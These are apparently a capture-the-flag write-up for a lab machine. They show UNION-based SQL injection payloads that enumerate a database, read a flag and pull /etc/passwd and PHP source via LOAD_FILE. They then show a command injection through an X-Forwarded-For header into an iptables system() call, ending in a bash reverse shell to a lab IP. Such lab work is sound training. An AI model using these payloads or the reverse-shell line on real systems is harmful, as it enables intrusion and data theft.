first nmap scan , only port 80 is open 
![[Pasted image 20240524161744.png]]



There's definitely something here our input is checked on db , but how can we inject our sql query on it 
![[Pasted image 20240524164641.png]]

let's check sqlmap 
![[Pasted image 20240524162539.png]]

sqlmap didn't find anything 


but if we try a manual , UNION injection we can see a different response that may lead to sql injection

![[Pasted image 20240524164820.png]]

we can use this to enumerate database

the database used is ==november==
![[Pasted image 20240524164945.png]]
the use is ==uhc@localhost==
![[Pasted image 20240524165106.png]]

we an get the tables using 
`' UNION SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES Where table_schema='november'--  `
![[Pasted image 20240524165512.png]]

so the tables is ==flag==
we can try to read the content of this table using
`' UNION SELECT * from november.flag--  `
![[Pasted image 20240524165638.png]]

UHC{F1rst_5tep_2_Qualify} , if we take a look at challenge.php we will notice that the page is asking for a flag 

if we submit it , we can got ssh open to our ip
![[Pasted image 20240524170203.png]]

but we need credential to ssh into machine , let's try to read files on the machine using sql injection 
`' UNION SELECT LOAD_FILE('/etc/passwd')--  `
![[Pasted image 20240524170450.png]]

Now we can read file , let's read the php files 
if we check the firewall.php 

`' UNION SELECT LOAD_FILE('/var/www/html/firewall.php')--  `
![[Pasted image 20240524170736.png]]

we can see that we can inject code in header 
`<section class="bg-dark text-center p-5 mt-4">

<?php
  if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
  } else {
    $ip = $_SERVER['REMOTE_ADDR'];
  };
  system("sudo /usr/sbin/iptables -A INPUT -s " . $ip . " -j ACCEPT"); 
?>
              

if we use HTTP_X_FORWARDED_FOR we can inject our code into this header

``
`X-FORWARDED-FOR: ;bash -c 'exec bash -i &>/dev/tcp/10.10.14.15/1337 <&1';

![[Pasted image 20240524175113.png]]

![[Pasted image 20240524175152.png]]

